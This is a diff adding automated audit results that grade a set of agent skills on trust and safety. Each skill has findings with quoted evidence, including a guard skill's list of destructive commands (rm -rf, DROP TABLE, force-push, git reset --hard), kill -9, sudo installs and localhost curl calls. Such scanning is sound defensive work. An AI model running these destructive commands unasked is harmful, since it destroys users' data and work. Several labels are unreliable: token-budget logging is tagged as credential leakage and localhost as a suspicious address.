+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: gstack-upgrade
+    format: claude-native
+    grade: D
+    overall_score: 0.535
+    file_path: SKILL.md
+    summary: "Needs work skill with 11 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	code	0.9	active	Hard reset destroys uncommitted work	"git): ```bash cd \"$INSTALL_DIR\" STASH_OUTPUT=$(git stash 2>&1) git fetch origin git reset --hard origin/main ./setup ``` If `$STASH_OUTPUT` contains \"Saved working directory\","
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: guard
+    format: claude-native
+    grade: F
+    overall_score: 0.482
+    file_path: SKILL.md
+    summary: "Poor skill with 12 suggestions for improvement (weakest: safety)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.7	0.15	0
+    actionability	0.6	0.2	0
+    safety	0.05	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	content	0.75	active	DROP TABLE/DATABASE is destructive	"protections are now running:\" - \"1. **Destructive command warnings** \u2014 rm -rf, DROP TABLE, force-push, etc. will warn before executing (you can override)\" - \"2. **Edit b"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: health
+    format: claude-native
+    grade: D
+    overall_score: 0.565
+    file_path: SKILL.md
+    summary: "Needs work skill with 10 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.8	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: investigate
+    format: claude-native
+    grade: D
+    overall_score: 0.505
+    file_path: SKILL.md
+    summary: "Needs work skill with 12 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-6	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"\"debug investigation root cause hypothesis bug fix\" 2>/dev/null || true fi ``` If `CROSS_PROJECT` is `unset` (first time): Use AskUserQuestion: > gstack can search learnings from your other projects"
+  - entity_type: skill
+    entity_name: land-and-deploy
+    format: claude-native
+    grade: D
+    overall_score: 0.505
+    file_path: SKILL.md
+    summary: "Needs work skill with 12 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-6	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"ploys.\" Then proceed to the FIRST_RUN flow below (steps 1.5a through 1.5e). **If FIRST_RUN:** This is the first time `/land-and-deploy` is running for this project. Before doing anything irreversi"
+  - entity_type: skill
+    entity_name: landing-report
+    format: claude-native
+    grade: D
+    overall_score: 0.565
+    file_path: SKILL.md
+    summary: "Needs work skill with 10 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.8	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: learn
+    format: claude-native
+    grade: D
+    overall_score: 0.565
+    file_path: SKILL.md
+    summary: "Needs work skill with 10 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.8	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: make-pdf
+    format: claude-native
+    grade: D
+    overall_score: 0.565
+    file_path: SKILL.md
+    summary: "Needs work skill with 10 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.8	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: office-hours
+    format: claude-native
+    grade: D
+    overall_score: 0.505
+    file_path: SKILL.md
+    summary: "Needs work skill with 13 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	7
+    findings[7	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	inline-command	0.9	active	Posts data to external URL	"ate new board with `$D compare` 4. POST the new HTML to the running server via `curl -X POST http://localhost:PORT/api/reload -H 'Content-Type: application/json' -d '{\"html\":\"$_DESIGN_DIR/design-board.html\"}'` (parse the port from stderr: lo"
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-5	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-6	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-7	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"kills/gstack/bin/gstack-learnings-search --limit 10 2>/dev/null || true fi ``` If `CROSS_PROJECT` is `unset` (first time): Use AskUserQuestion: > gstack can search learnings from your other projects"
+  - entity_type: skill
+    entity_name: open-gstack-browser
+    format: claude-native
+    grade: D
+    overall_score: 0.525
+    file_path: SKILL.md
+    summary: "Needs work skill with 12 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.1	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-destructive-3	DESTRUCTIVE	medium	code	0.9	active	Force kill can corrupt state	"ID\" ] && kill \"$_OLD_PID\" 2>/dev/null || true sleep 1 [ -n \"$_OLD_PID\" ] && kill -9 \"$_OLD_PID\" 2>/dev/null || true rm -f \"$(git rev-parse --show-toplevel)/.gsta"
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-5	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-6	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: pair-agent
+    format: claude-native
+    grade: D
+    overall_score: 0.565
+    file_path: SKILL.md
+    summary: "Needs work skill with 10 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.8	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+  - entity_type: skill
+    entity_name: plan-ceo-review
+    format: claude-native
+    grade: D
+    overall_score: 0.505
+    file_path: SKILL.md
+    summary: "Needs work skill with 12 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-6	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"kills/gstack/bin/gstack-learnings-search --limit 10 2>/dev/null || true fi ``` If `CROSS_PROJECT` is `unset` (first time): Use AskUserQuestion: > gstack can search learnings from your other projects"
+  - entity_type: skill
+    entity_name: plan-design-review
+    format: claude-native
+    grade: D
+    overall_score: 0.505
+    file_path: SKILL.md
+    summary: "Needs work skill with 14 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	8
+    findings[8	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	inline-command	0.9	active	Posts data to external URL	"R/design-board.html\"` 5. Reload the board in the user's browser (same tab): `curl -s -X POST http://127.0.0.1:PORT/api/reload -H 'Content-Type: application/json' -d '{\"html\":\"$_DESIGN_DIR/design-board.html\"}'` 6. The board auto-refreshes. **Ask"
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-5	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-6	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-7	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"kills/gstack/bin/gstack-learnings-search --limit 10 2>/dev/null || true fi ``` If `CROSS_PROJECT` is `unset` (first time): Use AskUserQuestion: > gstack can search learnings from your other projects"
+    trust-suspicious-url-8	SUSPICIOUS_URL	medium	content	0.75	active	Direct IP address (no DNS = suspicious)	"browser tab: \"I've opened a comparison board with the design variants: http://127.0.0.1:<PORT>/ \u2014 Rate them, leave comments, remix elements you like, and click Submit w"
+  - entity_type: skill
+    entity_name: plan-devex-review
+    format: claude-native
+    grade: D
+    overall_score: 0.505
+    file_path: SKILL.md
+    summary: "Needs work skill with 12 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-6	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"kills/gstack/bin/gstack-learnings-search --limit 10 2>/dev/null || true fi ``` If `CROSS_PROJECT` is `unset` (first time): Use AskUserQuestion: > gstack can search learnings from your other projects"
+  - entity_type: skill
+    entity_name: plan-eng-review
+    format: claude-native
+    grade: D
+    overall_score: 0.505
+    file_path: SKILL.md
+    summary: "Needs work skill with 12 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.0	0.2	6
+    findings[6	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
+    trust-exfiltration-3	EXFILTRATION	high	script	0.9	active	May leak secrets (credential in output)	"{ host: currentHost, error: new Error('Stale files detected') }); } // Print token budget summary if (!DRY_RUN && tokenBudget.length > 0) { tokenBudget."
+    trust-exfiltration-4	EXFILTRATION	high	script	0.9	active	Logging credentials to console	"= tokenBudget.reduce((s, t) => s + t.tokens, 0); console.log(''); console.log(`Token Budget (${currentHost} host)`); console.log('\u2550'.repeat(60)); for (c"
+    trust-privilege-5	PRIVILEGE	low	script	0.9	active	Requests elevated privileges	"t >/dev/null 2>&1; then echo \"Attempting apt-get install scc...\" if sudo apt-get install -y scc 2>/dev/null; then echo \"Installed via apt.\""
+    trust-injection-6	INJECTION	critical	content	0.75	active	Conditional logic based on first run (rug-pull pattern)	"kills/gstack/bin/gstack-learnings-search --limit 10 2>/dev/null || true fi ``` If `CROSS_PROJECT` is `unset` (first time): Use AskUserQuestion: > gstack can search learnings from your other projects"
+  - entity_type: skill
+    entity_name: plan-tune
+    format: claude-native
+    grade: D
+    overall_score: 0.535
+    file_path: SKILL.md
+    summary: "Needs work skill with 11 suggestions for improvement (weakest: trust)"
+    dimensions[6	]{name	score	weight	findings}:
+    completeness	0.8	0.2	0
+    clarity	0.6	0.15	0
+    actionability	0.75	0.2	0
+    safety	0.3	0.15	0
+    testability	0.6	0.1	0
+    trust	0.15	0.2	5
+    findings[5	]{id	category	severity	source	confidence	disposition	message	evidence}:
+    trust-destructive-1	DESTRUCTIVE	medium	script	0.9	active	Hard reset destroys uncommitted work	"check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file edits are within the allowed s"
+    trust-destructive-2	DESTRUCTIVE	medium	script	0.9	active	DROP TABLE/DATABASE is destructive	"string> = { Bash: 'check bash commands for destructive operations (rm -rf, DROP TABLE, force-push, git reset --hard, etc.) before execution', Edit: 'verify file"
